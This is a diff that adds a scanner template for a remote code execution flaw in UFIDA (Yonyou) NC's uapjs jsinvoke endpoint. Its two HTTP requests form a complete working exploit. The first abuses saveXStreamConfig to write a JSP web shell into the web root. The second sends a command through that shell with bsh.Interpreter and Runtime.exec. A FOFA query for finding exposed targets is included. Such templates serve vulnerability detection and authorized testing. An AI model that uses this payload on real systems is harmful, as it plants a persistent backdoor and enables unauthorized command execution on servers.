@@ -1,0 +1,52 @@
+id: CNVD-C-2023-76801
+
+info:
+  name: UFIDA NC uapjs - Remote Code Execution
+  author: SleepingBag945,s4e-io
+  severity: critical
+  description: |
+    There is an arbitrary method calling vulnerability in UFIDA NC and NCC systems. By exploiting the vulnerability through uapjs (jsinvoke), dangerous methods can be called to cause attacks.
+  reference:
+    - https://mp.weixin.qq.com/s/8ZRrmUCD2bfznd1MyDDU8A
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="用友-NC-Cloud"
+  tags: cnvd,cnvd2023,yonyou,rce,intrusive
+
+variables:
+  filename: "{{rand_base(12)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/{{filename}}.jsp"]}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body)==0"
+          - 'status_code == 200'
+        internal: true
+
+  - raw:
+      - |
+        POST /{{filename}}.jsp?error=bsh.Interpreter HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded
+
+        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"Windows", "<?xml", "DNS")'
+          - 'status_code == 200 || status_code == 404'
+        condition: and
+# digest: 4a0a00473045022046a169261dc45f5611da72f345a618ce25248f20422d07e68fe68d51f296530e022100e777ae40200be3c0cc2b9fad210394f03a553f72c7052b6dca5ed1349b64decb:922c64590222798bb761d5b6d8e72950
